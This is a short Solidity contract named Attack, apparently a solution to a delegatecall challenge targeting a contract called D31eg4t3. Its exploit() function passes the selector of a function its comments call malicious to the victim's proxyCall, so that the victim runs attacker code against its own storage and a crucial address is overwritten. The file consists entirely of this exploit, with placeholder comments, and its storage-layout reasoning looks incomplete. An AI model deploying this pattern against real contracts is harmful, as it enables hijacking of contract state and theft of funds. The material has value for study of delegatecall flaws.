// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // Assuming the first variable in the victim contract is an address we want to overwrite.
    address internal targetAddress;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here

    // Malicious function that could be named similarly to a benign function in the victim contract
    function changeResult() external {
        targetAddress = msg.sender; // Example action: Overwrite a crucial address
    }

    function exploit() external {
        // Craft the data for the delegatecall
        // The function selector for `changeResult()` in our contract
        bytes memory data = abi.encodeWithSelector(Attack.changeResult.selector);

        // Cast the victim address to the interface and make the proxy call
        ID31eg4t3(victim).proxyCall(data);
    }
}
